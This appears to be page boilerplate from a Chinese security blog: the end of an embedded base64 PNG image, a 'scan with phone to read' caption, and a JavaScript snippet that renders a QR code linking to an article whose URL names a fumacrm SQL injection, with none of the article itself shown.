s3ryyFPpTqM3JxoboY9Iz9DyD3NzXqXpg/fy9unerquV4in8ia4fQ2BTBuew75/J6wO6bPi6taJ6iKkDwTVRYgOKG0ITL9OeS+Y+zaAx759zIvwuA7W/vUK8RTfBLeBOO0zXO0bMnUImoORf1W3ruN+vyuv63JrO+865HOAOVov9vqVDsd+20AsuvC1J3AYCBynBpzusj8V8o7A/e91dQjvN9AXuw+pgyOahXjyVS99EcY6des76kPqYMTuy8V9v8NADF34mhP49kCcLuSp8NOAcAiqizDqEG4/c6L6IzTb0RrIPSDYc3Lz8o6Qegj2fOe9Xl+E9AGu97Jub/bx7VdI/3ycuroc8hTIu68Oyel3hMd+5e0llrZfXZfDee99H68hdfZRF7sOyXe/cn99IN7kwq+dwGEgNaXZOmtvzSqnD+PTscrDmIM5h+jA1gq4fyenAN/jqz5+TvqfRRj3VfWHgZR4rdedwDYQyLTgMa62CmOdTw9E73Vnfs/LrRPVZwi5t9mOs5rSzNX1fqmLenLI/bq+4uqQOuD6Luv2Zh/bK+TN9vWf3c7/AAAA///f+EkZAAAABklEQVQDAMFqVrODWrQfAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxOrderManage-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 